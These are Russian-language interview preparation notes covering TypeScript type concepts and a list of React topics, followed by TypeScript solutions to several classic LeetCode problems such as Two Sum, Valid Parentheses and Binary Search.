##### **Какие типы данных поддерживает TypeScript?**

  

- **Ответ:** TypeScript поддерживает:

    - Примитивные типы: `string`, `number`, `boolean`, `null`, `undefined`, `symbol`, `bigint`.

    - Сложные типы: `array`, `tuple`, `enum`, `object`, `function`.

    - Специальные типы: `any`, `unknown`, `void`, `never`.

##### interface vs type

- `type` может использоваться для создания псевдонимов для любых типов, включая примитивы, объединения и пересечения.

- `interface` используется только для описания формы объектов и может быть расширен с помощью `extends`.

##### type guards

##### generics

##### union / intersection

- - **Union types (`|`):** Позволяют указать, что переменная может быть одного из нескольких типов.

        typescript

        let value: string | number;

    - **Intersection types (`&`):** Позволяют объединить несколько типов в один.

        typescript

        type A = { a: string };

        type B = { b: number };

        type C = A & B; // { a: string, b: number }

  

---

##### any vs unknown

`any` — это тип, который отключает проверку типов для переменной. Его следует использовать только в крайних случаях, когда тип неизвестен или сложно определить.

`unknown` — это тип, который требует явного приведения перед использованием. В отличие от `any`, он безопаснее, так как не позволяет выполнять операции без проверки типа.

  

##### **абстрактный класс**

Абстрактный класс — это класс, который не может быть инстанциирован напрямую. Он используется как шаблон для других классов и может содержать абстрактные методы (без реализации).

  
  

## React

##### зачем нужен

##### виртуальный ДОМ

##### коммит/рендер

##### состояние

##### useMemo, useCallback, memo

##### useEffect

##### context

  
  

## Алгоритмы

  

О() нотация

массивы

хэш-таблицы

бинарный поиск

сортировка

  

### [125. Valid Palindrome](https://leetcode.com/problems/valid-palindrome/)

```typescript

function isPalindrome(s: string): boolean {

  

  if (s.trim() === "") {

    return true;

  }

  

  let str = "";

  

  const lowerString = s.toLowerCase();

  

  for (let i = 0; i <= lowerString.length - 1; i++) {

    if (

      (lowerString[i] >= "a" && lowerString[i] <= "z") ||

      (lowerString[i] >= "0" && lowerString[i] <= "9")

    ) {

      str += lowerString[i];

    }

  }

  

  let left = 0;

  let right = str.length - 1;

  

  while (left < right) {

    if (str.charCodeAt(left) === str.charCodeAt(right)) {

      left++;

      right--;

    } else {

      return false;

    }

  }

  

  return true;

}

  

```

### [242. Valid Anagram](https://leetcode.com/problems/valid-anagram/)

```typescript

function isAnagram(s: string, t: string): boolean {

    const n = s.length;

    const m = t.length;

  

    if (n !== m) return false;

    const hash = new Map<string, number>();

  

    for (const i of s) {

        const value = hash.get(i) || 0;

        hash.set(i, value + 1);

    }

  

    for (const i of t) {

        const value = hash.get(i) || 0;

        hash.set(i, value - 1);

  

        if (hash.get(i) < 0) {

            return false;

        }

    }

  

    return true;

};

```

### [20. Valid Parentheses](https://leetcode.com/problems/valid-parentheses/)

```typescript

function isValid(s: string): boolean {

    const characters = ['{', '(', '['];

  

    const stack = []

  

    for (let i of s) {

        if (characters.includes(i)) {

            stack.push(i)

        } else {

            if (stack.length > 0) {

                let last = stack.pop()

                if (last === '{' && i !== '}') return false

                if (last === '(' && i !== ')') return false

                if (last === '[' && i !== ']') return false

            } else {

                return false

            }

        }

    }

  

    if (stack.length > 0) return false

  

    return true

};

```

  

### [1. Two Sum](https://leetcode.com/problems/two-sum/)

```typescript

function twoSum(nums: number[], target: number): number[] {

    const map = new Map<number, number>();

  

    for (let i = 0; i < nums.length; i++) {

        let diff = target - nums[i];

        if (map.has(diff)) {

            return [i, map.get(diff)];

        }

        map.set(nums[i], i);

    }

    return [];

};

```

  

### [217. Contains Duplicate](https://leetcode.com/problems/contains-duplicate/)

  

```typescript

function containsDuplicate(nums: number[]): boolean {

    const set = new Set(nums);

  

    return nums.length !== set.size;

};

```

  

```typescript

function containsDuplicate(nums: number[]): boolean {

    const map = new Map<number, boolean>();

  

    for (let num of nums) {

        if (map.has(num)) return true;

        map.set(num, true);

    }

  

    return false;

};

```

  

### [704. Binary Search](https://leetcode.com/problems/binary-search/)

```typescript

function search(nums: number[], target: number): number {

    const n = nums.length;

    let left = 0;

    let right = n - 1;

  

    while (left <= right) {

        let mid = Math.floor((left + right) / 2);

  

        if (nums[mid] === target) {

            return mid;

        } else if (nums[mid] < target) {

            left = mid + 1;

        } else {

            right = mid - 1;

        }

    }

  

    return -1;

};

```